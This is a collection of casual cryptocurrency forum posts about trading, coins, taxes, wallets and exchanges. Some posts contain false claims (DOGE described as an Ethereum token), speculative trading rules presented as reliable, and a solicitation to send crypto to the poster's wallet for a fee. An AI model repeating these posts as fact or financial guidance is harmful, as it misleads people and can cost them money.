 Today I received a bunch of moons and think its super cool. Then some one posted about potential use cases for moons. It didn't take me long to come u with my answer. Maybe its been discussed already. IDK but all i can add is that there is no more noble use case for crypto than donating to charity. What if 2.5 or 5 or maybe even 10% of the monthly distribution was donated to a charity of choice voted and agreed upon by the people? With so many in need these days surely we could find one organization, one good cause to throw moons at where they could make something beneficial out of them. 

Crypto fascinates me and participating in this sub is just one more layer to an endless never boring space that has flipped my life upside down. Yes, I came for the wealth potential, the philosophy and tech. I stayed for all the reasons I mentioned but now I am having fun. A lot of fun. 

Sometimes I zoom out and take notice of the world I am living in and can't help think we can help so many people with with our wealth. Crypto provides us something fiat can't and that is transparency. For the first time in our lives we can be certain that our donations are being spent on what was promised. I'd be really happier participating in this sub and other crypto spaces if more was shared with those who need it. Whatever the institution might be. Children, cure illness, homelessness, war victims, climate change etc. Surely this sub can adopt one deserving charity or cause that really needs it.

I dont get it? Zero fees, instant transactions, but yet it seems to be frowned on by many. Why did it not blow up? How is it not on Coinbase? Am I missing something? I have used nano to send small sums of money between friends and it always works so well. I even accepted Nano for a market place sell once. The buyer was so excited when he found out that I accepted crypto.  Could nano ever come back in a big way?

I know that Nano is peer to peer, and works in a much different way than say BTC or ETH. Does this make Nano less secure, or is it simply a lack of innovation? 

Full disclosure: I have less than 10 Nano. Im not looking for this to pump. I just want so insight on why it went from neat-O to meh  over time.

"Money makes Money"...

An ancient rule in Investing that makes people put all of their money in their Coins and doesnt even take a penny till they achieve Lambo...

And lets rewind a bit! While this strategy is so nice and, in paper "the most profitable way". In reality, it doesnt work out that well...

See i can have 5 zeros on my Binance account, but it doesnt matter till i see that green George Washington in my hand!

Taking profits helps you recharge, reward yourself, and most importantly: Would decrease the stress and dumb moves that you make!

See, remember your last FOMO! You checked your money and though "Damn, if it makes %50, i can finally buy Shrek 2 bluray version with my profits!" 

And other than you have an Incredible movie taste, you also probably never gonna get Shrek 2 cause you either  

A) Loose in FOMO.
Or:
B) You would FOMO again on a different Coin to buy a Shrek plush alongside it.

And you could likely to avoid it all, if you would just bought the Shrek 2 and the plush the second you wanted it...

Investing is nice! There isnt a single feeling like doubling your money! But none of this really matters if youre not happy doing it all!

Stay safe, Love y'all!

Pretty much what the title says.. it took me some time to realize that we already in the altcoin season of this year. 

I started to actively trade using coinbase pro/coinbase and heres my observation- I see 1-2 new coins from coinbase hitting their ATH every day. But the catch is, its staying at ATH only for a brief moment.  

Heres what you can do:
1) find the projects from coinbase that havent mooned yet
2) invest in them as much as you can (DYOR) 
3) consider market cap and circulation supply before investing a lot of your money 
4) place a sell order when your coin hits 1x or 1.5x ( this will help you sell your coins when it hits new ATH with decent profits on your hand)

Do you agree with my strategy? 
Whats yours ?

Is this shilling? Idk maybe, I dont really have much invested in Solana so I dont have a stake in the game but whatever call me what you will.

But Solana has quietly continued to outperform the market. I feel like Solana is constantly peoples number five crypto: everybody likes it but nobody is out here yelling about it. 

Personally I stick to the coins/tokens/etc with good tech, no offense to the Shibites or Dogenites or whatever you call them, I just prefer good tech over good financials.

But Solana has quietly risen, what, 18,000% (vs the market 500%) over the year and now holds over 2% of the market. 

I know people do mention it all the time, but I still feel like it doesnt get talked about enough. Can we show some love? Id love to hear from some of the massive SOL fans, I know youre out there. Why is this coins doing so well?

Perhaps not hard, or at least not as hard with Bitcoin, but how do you convince yourself that it's a good idea to buy the dip on a more speculative coin.  I just started investing at the beginning of September, so I watched most of what I bought fall before it started pumping again.  I put more in to new coins when the market was down, but I haven't been able to pull the trigger and buy more, for instance, Cardano, as it dipped below $2 after having bought it at close to $3.

How do you weigh the benefit of bringing down your average cost versus a desire not to increase your exposure on an investment that isn't going your way?
-------------------------------
1 : 2021-11-04
Yes, there are a few that seem to occasionally know what they are talking about, I'm not talking about those few.

I'm talking about the ones who all have 1 of 4 facial expressions in the thumbnail for every video.  I'll call these expressions OMG, ZOMG, WTF, and ZOMGWTF. You know the ones. 

They all make ridiculous claims in the title and then talk about something completely unrelated for the duration of the video without referencing whatever claim they make in the title. 

Oh and don't forget to put in a colorful chart that only ever goes up, can't give the illusion that something might be going down.  Unless of course, the sole purpose of your channel is to push your coin and shit on all others in existence. 

Then they get a million views from idiots who will keep coming back for more.

Some people need to learn from experience in this Crypto game! Listening to Shiba members bashing, insulting "paperHands" to stay on a sinking ship in order for them to minimize their losses is what happens alot on Reddit.!!    

Do your own research and trust your gut feeling! Don't trust a 3rd world Clown on Reddit bullying you into holding!  When he says HODL he doesn't wanna lose his bread and rice money he recklessly invested and now has to starve or eat bark! Hes asking you to chance it and go down with him since he is at a huge loss. Investing in something that has healthy daily, weekly growth, movement, potential from media releases is your best bet. Sure its nice to jump on a hype coin and get exited, but make no mistake what goes drastically up, drastically comes down! Good day to all and Good night!

Hi guys, I'm fairly new to the crypto world and I'm looking for some advice. I did my first big purchase of Eth in May (roughly 70% of my portfolio) and threw a few bucks at some other small cap rando coins. Needless to say Eth has been doing well since May. Id like to add to my Eth position and Fantom. So I'm wondering what is a better strategy for adding? 

A: Do a bunch of small buys as I get paid and can afford to slowly add to my position. 

B: Save up all that cash for a few months and do a larger buy. (i feel like i would miss out on gains doing it this way) 

C: Some other way I don't even know about?

I hate raising my share price buy continuing to buy as eth goes up, but i want a larger position.

Any info/ recommendations/ advice would be greatly appreciated.

Thanks

Many people view their crypto buys as long term investments and many people are in it for the quick sexy gains. 

But looking back, those who bought BTC in 2016 and didn't sell are doing incredibly well with their initial investment. 

However with the potential insane short term gains in this market, most people sell after a relatively short period or buy and sell chasing pumps.

We've seen tons of posts about when to sell and nailing the exact right time. How many of you won't be selling at all this bull run?

So, what you guys think about the new excitement and content going on in the loopringorg subreddit? Ive been reading a lot of conflicting opinions from both the OG loopring crowd and apes and just want to know what the most popular crypto reddit group thinks about it.

Back in September, I made quite a bit of posts stating that Bitcoin will go on a run in October/November when Bitcoin was at around 42K or so.  And I also predicted that in November/December, Bitcoin will probably get to 100K, prompting an altseason that would culminate this season.  Now, I am having second thoughts and might think that we are near the end.  Couple of reasons. 

&amp;#x200B;

1. For there to be a bull run, Bitcoin has to go on a massive run first.  It would be akin to what we saw when Bitcoin went from 40 to 67K with most of the alts bleeding in SATs.  However, this run has stalled and alts have quickly recovered with Bitcoin dominance still at low 40 percent.  Contrary to what your portfolio might tell you, alts recovering this fast in midst of what is supposed to be a bull run is not necessarily bullish long-term. 
2. I think what is going on is that the retail investors (people like you and I) do not have much appetite for Bitcoin.  In the previous runs, it was the retailers that FOMOed in late in the game and their predicted entrance allowed the whales to pump up the market so that the retailers would be holding the bags at the top.  However, I think the analysis is that retailers are not FOMOing into Bitcoin so they will not be holding the bags if Bitcoin goes to 100K or so.  It is the (a) seemingly high price tag of Bitcoin and (b) expected more gains from alts that are leading to retail investors away from Bitcoin.  And this lack of enthusiasm probably means that the whales will not be "eager" to continue this run by buying in at this 60-90K range.  I mean, who will be holding the bags if they are buying high?  
3. It is becoming more of a common knowledge that there is the following sequence of events: (1) Bitcoin goes on a solo run (2) Bitcoin stalls (3) altseason (4) bear market.  It is almost like a formula and this is what happened in 2017 as well as 2020/2021 May.   Because this information is so common, it won't be easy this time around.  I mean we have a full blown altseason, a lot of the retailers manage to sell near the top, and they aren't bag holding.  How likely is this?  I think because this "formula" is so pervasive, the rules of the games are changing.  Remember, when a cycle is over, it is always the retailers (people like you and I) that are left holding the bags.  And if the "formula" is so obvious to everyone, then these sequence of events will not happen.  

This is not to say that there won't be a run in November/December.  It is possible that in the next couple of months, Bitcoin goes to 100-120K, there is an altseason, a lot of people on the Cryptocurrency reddit forum sell right at the top after the altseason, and whales/miners are left holding the bags.  It is possible, but how likely is this?

I noticed something this afternoon that genuinely has me perplexed.  I was looking at Coinbase today, and IOTX was going absolutely nuts.  It currently shows that it peaked today at 39 cents before pulling back.  But when I look at virtually every other platform, it shows that it topped out around 14 cents over the last 24hrs.  

Was the pump that I watched happen and then pull back completely isolated to one trading platform?   That seems terribly unlikely given that its market cap is inside the top 50, and Coinbase had it trading at nearly 3 times what everyone else was at one point today.  

So Im asking  Whats going on here?

As we are all professional traders here with extensive knowledge and expertise in all things crypto, do you believe at any point prices will diverge  from their parent? When ETH dips, everything within the ETH environment dips and equal amount across the board. Is there any thoughts or possibility of a coin/token on the ETH network operating independent of ETH price? 

I fully understand why ETH and those within the environment dip, but I'd like to hear some opinions or upcoming projects that look hopeful.

r/CC I have a serious problem... I cant take my eyes off the charts and its negatively affecting my life. I have been skipping dates and the opportunities to spend quality time with my girlfriend because I want to look at the charts. 

Been saying no to friends every time they tell me to go out with them, cause Id rather be at home staring at the charts. And its especially been a problem at work. I have a presentation I was supposed to prepare to present with the office but I havent started gathering reports as I have been occupied on the charts.

r/CC how do you stop staring at charts all day?

Ya you read that correctly, your eyes are fine. Ethereum is a shitchain, and Ether is a shitcoin. Just because the price is 4600+ shitdollars, doesn't change the facts Randy.

The network is bloated with bot generated contract spam, and the "fee market" makes it practically unusable for normally wealthed people. I constantly read posts across the crypto subs about how it costs $200 to send $30 of some token. A decent design wouldn't require layer 2 bullshit at all. Ethereum is already too complicated for normies, adding layers of additional complexity just so basic transactions don't cost a small fortune in some 3rd world economy is a non starter.

People mistakenly believe that some ETH2 shenanigans are going to fix this inherently broken design. Newsflash, in 2 years when ETH2 might actually be functioning, it's going to be even worse. Ya !remindme 2 years, You'll see.

Ethereum as programmable money may have been a revolutionary concept back in 2015 or whenever it was released, but the implementation hasn't stood up well to adoption.

Can you make money with it? Sure as long as people keep aping into it, but the cryptoverse is going to wake up to the horror that is this shitchain and then you'll see the apocalyptic price crash it deserves.

There are always new people coming into crypto wanting to be rich in a couple of months. I am not saying that it is unachievable, however, it is extremely unlikely that you would be that lucky individual. We all know about that one gave who turned 8k to 5 billion within a year with SHIB. You need to remember this, for someone to make those gains there are people who are losing.

There are several important quotes in crypto that make a lot of sense.

1. **Time in the market is better than timing the market**
2. **DCA in and DCA out** (in during bear and dips put during bull and pumps)
3. **When in doubt just zoom out**

Now to the title of this post, why 3 cycles? Here is the short and quick version for all those peps with a limited attention span like myself.

The 1st cycle is where you make the most mistakes, trying the time the market, FOMOing, and regretting your decisions. This is the cycle of education, you, make the most mistakes but you learn the most too.

In the 2nd cycle, you are winning making some gains knowing your mistakes, and getting cocky. Finally, your cockiness bites you in the back and you make fewer gains than you could have.

Finally, in the 3rd cycle, you have learnt your mistakes and know that following rules emotionlessly is the best way to go. You have made gains before and because you are in the market for a long time now those initial gains are doing you greatly. You are better a DCA in and DCA out. Finally, you make it and dry your Lambo and showcase your success story.

Rules to follow:

Before anything, the most important rule is to at least get your original investment back as soon as possible. Taking from a coin or a token selling from your valuable bag of diamonds is a MUST. You need your original money for many things (real life bills, re investing, paying for unexpected stuff)


Now as for the ongoing bull market and crypto in general:

1- If a coin/token been up for more than 3 days in a row, sell at least a large portion of your current position. Prices should drop even for a day or two, maybe weeks too.

2- if its been down for 3 days in a row, sell it as it chances are it will go down even more. Re buy if you want

3- just like you DCA in, learn to set targets and DCA out. 

If RSI is 90 or more for a coin/token it will go down meaning a sell will have to happen.

Learn These metrics: RSI, MA, EMA, MACD, BOLL

This is not a financial advice just a few crypto habits i go by that helped me so far 

GG WP Good luck al

Hello my fellow crypto junkies! Hope you are all having a good day full of green dildos!

With Bitcoin and Ethereum reaching new all time high, it seems,hopefully, that alt season is coming closer and closer. As most of us is here for making money generally, and some for the tech, what is ur opinion on which coins could make huge returns in the upcoming period (10x,20x)? I am hoping that one of my bags make my portfolio grow rediculously!  

Cmon people, give ur opinions on what are those hidden gems that are ready to explode! May the green days come ahead!!

Hello,

Extreme noob here, terminology is most likely wrong. 

Been researching crypto (Im new to investing as a whole (besides rrsps/tfsas etc)) for about 3-4 months. 

Im extremely nervous when it comes to fucking up and getting destroyed when taxes come around. Also nervous in terms of general rules in a crypto market

Im wanting to dca into reputable coins and play with some shitters.

Again, using binance in Canada. 

Ive been really trying to study up fast, but extremely nervous as it seems there are quite a few rules in terms of taxes up here.

Any tips/help would be much appreciated. 

Im assuming for what I want to do it is much simpler than it is in my head.

Help me out here

So, I bought Mana at 4.67 CAD it was the first time I had ever heard about this project and after doing some research on it I believe it has a lot of potential. However, I have seen some people on Twitter say that they expect $10-20 EOY. I am actually wondering if this could happen or if they are just being hopeful. What do you guys think the price of MANA will be by January 1st 2022? I have a hard time reading graphs and understanding all the technical analysis and I rely on YouTube videos to help me understand everything but the price predictions for Mana are all over the place so I am turning to this subreddit for help! Thanks in advance

Unpopular opinion, maybe even an uneducated opinion, but my opinion nonetheless. 

Crypto since its inception has followed trends, Bitcoins halving, and a few other hurdles. 

However this past year has been a breakthrough year in its adoption and notoriety with tens of millions of new retail investors, hedge funds, celebrities, pro sport teams, pro athletes, gamers and even countries.  

With all that and more considered, I think its fair to say that maybe, just maybe, the crypto winter that gets mentioned daily on numerous threads, might not be inevitable. 

I may sound naive and Im sure my judgement is clouded with bias sentiment towards crypto as a whole. But f*** it, thats how I see it, and your fancy charts dont sway me one bit.

So I have this wild idea for a low graphical but high strategy crypto game. Without giving away all the details, one of the greatest features of it would be "Sponsors" ability to stake on active "Players" success. 

So first, lets define the difference between "Players" and "Sponsors".

A "Player", would be someone who is dedicating their in-game time and effort. Each player would start with a base stat setup. They can work in-game to earn more stats, and increase their rate of success in the game over time. A highlight of being a "Player" is that you can lend out your reward rates by opening your stats for "Sponsors" to buy into for improvement. So when a "Player" has success, the "Sponsor" also takes in a percentage of their reward (staking rewards).

A "Sponsor" is anyone who wishes to observe the gameplay, and would have the option to stake "Players" at will (given that the Player has opted-in and set their rates). Staking would require a commitment of their staked tokens to be locked in a time frame also decided by the "Player" (limits will apply, as to keep a percentage of balance between players, aka 1 Player can only run HOT for so long before another Player has an opportunity to out-rank them).

For "Players", the game itself will be played via an executable on PC, as the game acts as a validator for the tokens acquired/rewarded. For the "Sponsors", they would be able to interface to the system in a web-based platform, allowing them to move their tokens in and out of the system via wallet.

So, do you think a game with the ability to stake another players success could have a chance of growing into something worth while?

I've been day trading SHIB and doing well...but recent analysis shows the price broke through the bottom of a flag pattern. Could be because Kraken said they'd list it and today postponed doing so.  But Binance just listed a SHIB/DOGE pair so that's good news, I think.

I'm new, but learning fast. Hoping some wise members can shed light on what the short term looks like for SHIB.  Drop some of that sweet knowledge on your boy.

Full disclosure: I started buying in 10/17 after having planned to buy in on 10/1 but got lazy...ooof.  I've got 55k in long positions and use an additional 15k to day trade.  Of the 55k, 40 is in btc and eth with the rest in things like SOL, ADA, DOT, etc. I'm putting at least 40 hours a week into learning the crypto market and day trading.  I'm in for the long haul and fully intend to give back to this community.  I have a friend starting a 250k mining operation.  Other friends and I are looking into doing one as well.  I am looking for other similarly like minded people to share info with (not that a guy with only 1k in doesn't have good info, just that when you have serious skin in the game, you don't issue opinions haphazardly).

At first, I must say that don't care about lotteries, and I don't care about shitcoins even more (although I admit that I'm no expert and I may be fooled sometime in the future - i hope that not.) 

anyway .... I've been thinking about the difference between buying a lottery and buying a shitcoins for the same money. 

when does one have a better chance of winning? lottery or yolo to something unexpected?

basically it doesn't even have to be shitcoin but any crypto currency because none of us is nostradamus to be able to predict which project will win.

OK, so at some point, I decided to give this whole 2FA crap a try and I downloaded Authy to protect my Robinhood account. I set it up, but I was still able to log in and out of my account and it wasnt making me put in a code. I thought nothing of it and just deleted the Authy app, and forgot about it. Fast forward a month later, I upgrade my phone and trade the old one in. I go to log into my robinhood on the new phone, and its asking me for the 2FA code from Authy! I download the Authy app again, and now its asking for the backup password and I have no idea what it is. I'm completely locked out of my Robinhood, and they're useless and impossible to get in contact with. 

I'm able to log into Authy since I have the same phone number.  Its just that I dont have the backup password to get the login code. I saw that I have the option to delete the robinhood account. Would that help??? Any advice would help.

There has been some interesting speculation about who the newest minted SHIBA INU billionaire is. Some crazy conspiracy type stories have hatched and even posts in this sub about who that person might be. 

While that is all very interesting, it legitimately got me thinking about what I would do if I was suddenly thrust into that position. Who would I tell? Would I ghost my employer and everybody I know and just quickly hightail it somewhere far away? What to do about the immediate family, like wife and kids, fiance, live-in relatives? What sort of security measures would need to be taken? How and when would I begin selling off chunks of my investment? Tax implications? So many questions. I can't even begin to fathom how life-changing wealth would forever alter my life, and perhaps not for the better. After all, we've all heard the stories about people coming into wealth that end up quickly going broke, being kidnapped and extorted, and their lives and relationships being destroyed by the often accompanying greed, jealousy, and corruption that comes with great wealth.

What would you do if you were the Shib billionaire?

Yesterday, one of Thailand's biggest banks bought 51% of Bitkub, the country's largest crypto exchange. 

Today in Australia, Commonwealth Bank announced it will allow its customers to buy and sell cryptocurrency through its app.

I believe this is the start of banks finally accepting crypto is not going anywhere and rather than deny it exists, they will now start to become one of the major forces influencing the industry.

Is this really good overall for the crypto space? Or if you're like me, are you also wary of the potential implications such as loss of privacy, increased regulation and more taxes?

Thoughts?

Guys i have a question, when transferring my coins to a software wallet (e.g. from binance to coinbase wallet) it asks for a fee. Now is this fee a fixed % of total amount or it is a fixed number? + i pay the fees to who? Binance or coinbase? + is it better if i just wait to but more coins and transfer all at once or it doesn't matter? + does the fees change from wallet to wallet or it is fixed for each specific coin in all wallets?. Thanks in advance. I am new to crypto and i am willing to join DOGE, SHIB, BTC, ETH. I need clear answers before i buy to be sure.

Is there any way to buy cryptos without using a bank account e.g. using an intermediary so that my bank doesnt know I am buying? I want to buy a good bag to HODL long term, but it bothers me that government and banks are tracking my buy/sell orders.

I did some research, but it looks like in all the solutions I encountered it was pretty clear that the money were spent for cryptos. If banks are to give info about my crypto movements to governments and federal agencies, it will be very easy to know how much I spent in DEX/CEX/P2P transactions  and so how much cryptos I have. Even if I use an exchange that doesnt have KYC, the transaction in my bank account will be easily connected to the cryptos I bought.. and my bank lately started contacting me about the risks of cryptos. This is really annoying, its invading my privacy and it bothers me. 

Is there any solution to this? How you guys buy your cryptos?

And that's mostly bc nobody knows shit about fuck when it comes to Crypto. Many speculate and try to do their best at guessing but in reality the market does what it wants. 

Anyways; I do have a real question. Besides ETH who will be the next BTC?

BTC besides being the first crypto created, it really has no use case other than a store of value. So it is pretty much the "gold" as many people refer it. (Blockchain technology isn't BTC so that doesn't count)

ETH bc of its many use cases is numero dos. And we can see that reflected on its price. Could be called the "silver" It also has a vast echo system. 

Which crypto out there besides ETH will be valued as much as BTC? Or even close to it. Which crypto, coin or token or whatever u wanna call it will reach those highs?

Is it possible? And if it is. Which coin has the best chance? 

Again, we don't know shit about fuck. But

#what's your best guess?

I'm thinking if I should consider diversifying my funds and stake some other projects instead of just hodling tokens this bull market. I was considering trying to collect NFTs but I figured maybe other dapps or chains might be better investments, I'm just not sure which ones. 

I read in an [article](https://www.investingcube.com/cross-chain-composability-of-smart-contracts-to-open-up-endless-opportunities-for-blockchain-projects/) that cross chains like deBridge, Polkadot, etc. might be a good investment since they help facilitate trade/contracts between chains, but I'm not sure if they're worth the stake or if I'm better off just hodling?

Can you do FIFO and LIFO as you please when tracking gain/loss or do you have to pick one and stick with it or can you only do FIFO.  Im not an accountant, accountants do my taxes, Ive already realized all gains so I dont really care, but just interested in what the generally accepted way is.  The IRS is tracking all this?  I know exchanges say they are reporting to the irs but we dont get tax docs.  Just seems like a lot lol.

I appreciate the response I got to this before, I had to repost due to undercounting the characters before.  I believe this is enough this time.  I appreciate your time and review in advance.  Thank you

Thanks again

So probably a noob question, I k ow the market is open 24hrs a day and prices can as far as I know change with that, am I right?

My question is, do crypto prices all update/refresh at the same rate and are they 24/7 or is there certain times etc?

I hold some eth and ada which updates fairly regularly and looping had been updating its price every few minutes for me, but for almost half a day doesnt appear to have moved or atleast not enough for me to notice but I havent witnessed it actually change in front of me where as earlier in the day it woukd have done a few times
I use crypto. Com app if that helps. Thanks

Every once in a while I've witnessed this strange phenomenon. I know coins get recommended on here often and most are scams or bag shillers. But every so often I'll see a post talk about some of the more popular projects and as soon as you comment on it you'll realize that all the legitimate comments giving solid opinions are downvoted to hell and all the ones agreeing or praising are upvoted like crazy. 

Almost like a trap to downvote anyone that disagrees with the topic, making you think it was never a discussion in the first place, makes you wonder wth is really going on and who is behind the post? The team or maybe a coordinated effort by users on here trying to manipulate votes. Am I the only one that sees this or has anyone else experienced this as well. I've seen it quite a few times.

Hello and welcome to Crypto! I have some tips for you I'd like to mention below.

First, only invest in projects that charge fees for gas. This will help burn baby burn your coin, but will NOT burn your tendies. In fact, you'll get even more tendies. A good option is to look to see if your coin is on rails and has backing by whales. Celeb backing is also a big plus and can gain your coin creds increasing your tendies. If Elon Musk has ever Tweeted about your coin, you've likely missed the FOMO rally, but hey, he may Tweet Diamond Hands tagging your coin, so you have that going for you.

Be sure to stake your coins and HODL. Selling your coins are bad idea. Just lolZ at those FUDs. HODL forever or be damned to finite. You will MOON! Don't leave your coins in an exchange, if you get hacked, you will likely lose all your tendies and never get them back. 

Good luck and see you in Bora Bora!

I have a couple of questions, but first, please let me know if I understand the basics or if I have it wrong:

Ethereum is the base (the layer-1) where most transactions take place. Due to an explosion in transactions and usage of DeFi (Decentralized Finance) and NFTs (Non Fungible Tokens) the layer-1 is now heavily congested, resulting in exorbitant fees.

A layer-2 solution is basically a fancy way of saying 'Let's offload some of the work to another layer to take pressure off the base which can only handle 15 transactions per second'.

Scalability means being able to cope with large numbers of transactions and how fast it manages them, and depending on the technology that the 'layer-2 solution' uses this can result in being able to cope with thousands of transactions per second, resulting in decongesting the network and lowering gas fees, thereby fixing the scalability problem in Ethereum.

Even if Ethereum 2.0 'scales' the layer-1 with the introduction of Proof of Stake and sharding, exponential growth of the network will eventually mean that hundreds of thousands of transactions per second will be necessary, therefore 'layer-2 solutions' will still be needed. It will be important to scale both layers, is this correct?

Now for my other questions, what about the tech behind the layer-2 solutions? What is the difference between sidechains, rollups (ZK and Optimistic)? Also, how does sharding scale the layer-1, how does that work? 

Also, is the following graph correct? are these solutions already moving transactions off the layer-1 and lowering gas fees?

I don't know if anyone has mentioned this or not, but here's a little trick I figured out.  When Doge and Shiba Inu were having their little back and forth the other day, I decided to try out something I'd been thinking about for awhile.

Someone had gifted me some Doge, so I just bought a bit of SHIB to play with and experiment on.  So, on Coinbase, they have this feature where you can convert from one coin to another coin on the same network, for NO fee.  DOGE and SHIB are both Ethereum tokens.  When one went up, the other went down, so I converted the down trending coin to the up trending one.  I did this a couple times as they flip flopped.  I made a 25% profit, and didn't pay any fees either.

Not too bad for my first try, and I wasn't even paying that close attention to the trends.

Ok Almighty Reddit folk. Has anyone had success moving IOTX from [Gate.io](https://Gate.io) to Coinbase? I think I may have messed up. Not bad, but would like to actually have the transfer go through. 

What I did was transfer X amount of IOTX from Gate to Coinbase using the IOTX address that was paired with the CB IOTX address on [iotexscan.io](https://iotexscan.io) . At this point the status is showing Pending Nounce = 1 .  It would seem it is hung there. 

Is there anyway to force the transaction through? Or am I screwed on the transaction? I know there is something with the difference in blockchains. Any help would be greatly appreciated.

1.Cash your crypto gains into USDT on the highs as a safehaven. 2.Convert your Crypto into another

How this works. I give you a wallet address to send your cryto to, which resides at cex.io. Once received I convert it to USDT or another cryto currency of the available cex.io trading pairs. Then send back to you to an appropriate crypto wallet minus the cex.io withdrawal fee and a 2% kiwiufo.com/tradecrypto service fee Can also help you reinvest at the appropriate time

DO NOT SEND YOUR SHIB CRYPTO TO COINBASE, THEY WILL HIJACK YOUR CRYPTO!!!

After sending my SHiB crypto from my wallet to coinbase, I have been going in circles with coinbase email customer service (one of the worst!) to find out where my crypto is because I cannot find it anywhere in my coinbase portfolio. The crypto was sent successfully and even my total balance on coinbase reflects that but I have no access to manage the SHIB or do anything. It's like coinbase has hijacked my crypto and on top of that there is absolutely no way to reach anyone to resolve this. I am just going in circles with their email customer service and getting nowhere. I can't believe a company of their scale is able to provide such poor customer service and get away with it. I am posting this, so I can help anyone considering sending their crypto to coinbase to think twice and beware of what you might get yourself into.

Hi everyone. Long timer lurker here (on Reddit in general), and a newcomer in cryptocurrency - less than a month ago, actually.

&amp;#x200B;

I've pretty much started out with knowing nothing, to barely knowing anything right now, but I just wanted to express my gratitude to everyone who has made a contribution here. 

&amp;#x200B;

I appreciate the informative posts about certain coins/tokens. Even though they're difficult to comprehend at first, I'm somewhat getting it. I even appreciate the other posts, whether it's about:

&amp;#x200B;

I know old-timers may be sick of it, and it does get repetitive (especially about squid games right now), but I'm still appreciative. I don't think I would learn as quickly as I am right now without the sub and the news sources. 

&amp;#x200B;

That being said, there are still so many things to learn so I'll (most likely) go back to lurking. Just wanted to express my gratitude to this community. :)

Liberal Senator Andrew Bragg says he is pleased to see one of the big banks move into the cryptocurrency space.

Commonwealth Bank announced it will allow its customers to buy and sell cryptocurrency through its app.

One in five Australians has cryptocurrency, Mr Bragg told Sky News Australia.

I just want the Australian economy to be a modern, dynamic economy. I dont want it to be looking backwards.

So if banks are moving into this space, I think thats a good thing.  


I'm celebrating for Australia. Yes, crypto is about decentralizing and getting away traditional FIAT from banking systems. At the end of the day though, increased reach will increase the infrastructure supporting crypto. Banks will try to get on crypto and end up being their own undoing.

DO NOT SEND YOUR SHIB CRYPTO TO COINBASE, THEY WILL HIJACK YOUR CRYPTO!!!

After sending my SHiB crypto from my wallet to coinbase, I have been going in circles with coinbase email customer service (one of the worst!) to find out where my crypto is because I cannot find it anywhere in my coinbase portfolio. The crypto was sent successfully and even my total balance on coinbase reflects that but I have no access to manage the SHIB or do anything. It's like coinbase has hijacked my crypto and on top of that there is absolutely no way to reach anyone to resolve this. I am just going in circles with their email customer service and getting nowhere. I can't believe a company of their scale is able to provide such poor customer service and get away with it. I am posting this, so I can help anyone considering sending their crypto to coinbase to think twice and beware of what you might get yourself into.

Im pretty new to crypto and Ive come to see massive volatility because im tired of watching my stocks do nothing all day. I have a basic understanding of blockchain technology. I only have made two crypto trades in my life, which was buying a small position of a 50-50 split of theta and tfuel because my uncle talks about it every time I see him and has poured more money into this coin than I can dream of. I like this coin because I get a dividend when i stake it in my wallet. Any tips on learning/where to start?

If you're not living in a cave for the last couple of weeks, believe me after seeing all this s&gt;!h!&lt;it I personally want to, you're probably aware of a coin called, SQUID GAME. A "Fan Token, Inspired by Netflix's hit show with the same name."

And not just inspiring, the Coin is literally a Crypto version of the series:

 Whatever it's that, you enter the game by your own will to make tons of cash.

 ... Or, being that you cannot sell the Coin once the game's started, which is the moment you buy it.

And now, we can finally add this list of absurd similarities that the players willingly return for the   
second time to play the game, in fact, knowing what it is!

People are *seriously*(?) investing In a confirmed rug pull? And they were saying that the show was fu&gt;!c!&lt;kin stupid, now ill tell you what is, fucking stupid: People who invest in scam projects to get rich in a day! But they cant even fu&gt;!c!&lt;kin sell the coin, **so whats the** madafu&gt;!c!&lt;kin **point?!-**

*(sigh)* Im sorry i lost the control a little, but **my god(!),** people are sometimes so dumb that i legit question how did they manage to survive this long?

Whatever, what do I even fu&gt;!c!&lt;king know, The'll probably 1000X in a day- Wait a sec?... *But you still  cant sell-* &gt;!FUCK IT!!&lt;

As the 2021 year starts to draw to a close, I was wondering what cryptocurrency tax software platform does this community think is the best to use for tracking all of the purchases and sells that an individual made throughout the year? Ive heard of many such as Koinly and CoinTracker, but Im not sure which one to do. Im just trying to gain insight on which platform is the best before making a decision and spending money. Although I have relatively a small amount of crypto, I am afraid of the consequences of making a mistake on my tax forms, which is why I want to use a trusted, reliable cryptocurrency tax software platform to do the job for me. Being able to integrate the results into something like TurboTax would also be needed. 

&amp;#x200B;

Overall, I think this is an important question that many other people within this community should start to think about as well.

Can you do FIFO and LIFO as you please when tracking gain/loss or do you have to pick one and stick with it or can you only do FIFO.  Im not an accountant, accountants do my taxes, Ive already realized all gains so I dont really care, but just interested in what the generally accepted way is.  The IRS is tracking all this?  Just seems like a lot lol.

Thanks

I flaired this as comedy so i wouldn't seem like a complete dick but this is for fucking real. Just read a post of a guy who buys his moonshot shitcoin based on what animal is represented on it. He found one with a horse and yolo'd. 

Am I the one losing my fucking mind here or has the crypto world really started going this way??? I'm so fucking confused. Don't you see? I am Mrs. Nesbit!!! All my years of academy training wasted...why am I even bothering to research projects anymore? Just need to throw my money at the next big pop culture trend coin.

Wait. Is there a buzz lightyear coin? Fuck it. I'm all in!!

Look, we all know that Lambos of all colours and yachts the size of small islands are all things we, theoretically, want to obtain from our crypto investments. 

And sure, one can dream right? 

But say you *actually* come across that kinda money. Are those *really* the things youd pour your money into? 

Fast cars, the nicest clothes, the tastiest of foods, some hot ladies, etc. 
 
Now I know that most of these dreams are satire in their nature. We say these things because we *think* thats what real wealth is. Maybe it is, and maybe Im wrong. 

But for me, my goal is to retire my hard working mother early. To give my father a big stack of cash for believing in me, and to give my closest of friends some piece of mind.

Once I achieve these things, then maybe Ill treat myself to a nice Lambo, probably slime green; and a yacht too. A big one. 

Health, wealth, and happiness are what I want. And I pray we all achieve this one day. 

God bless you all

Hey All-

Im new to the Cyrpto game. Ive been purchasing Crypto using Coinbase and Crypto.com but looking to set up a wallet. Any tips on a good one to utilize? Preferably web-based and something compatible with many different exchanges, ie Pankcake Swap/Biance or any others you recommend.

What if all these shit and meme coins are being put out on purpose to scare people away from actual products that have promise down the road? If enough people get screwed on shit coins they will piss moan and bitch about how they were scammed. Then a lot of people like boomers will say "I told you so". That will take eyes off actual crypto and then when the govt decides to release its own digital currency that will moon and the rest will flutter. Just my opinion. Is this scenario even possible? I was thinking about it today when I read about squid token and my mom said "I told you so" haha. BTW I did not buy into that stupid shit lol.

Hi all. I asked this in the nano sub as well, but I would value as many perspectives as I can get. Don't want to get caught in an echo chamber. 

&amp;#x200B;

